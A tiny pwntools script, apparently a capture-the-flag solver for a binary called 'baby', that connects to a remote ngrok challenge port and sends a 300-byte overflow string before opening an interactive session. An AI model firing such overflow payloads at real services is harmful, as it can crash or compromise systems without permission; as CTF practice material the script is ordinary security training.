from pwn import *
exe = context.binary = ELF("./baby")
r = process()
r = remote("0.tcp.ap.ngrok.io",18872)
# sleep(10)
r.sendline(b"A" * 300)
r.interactive()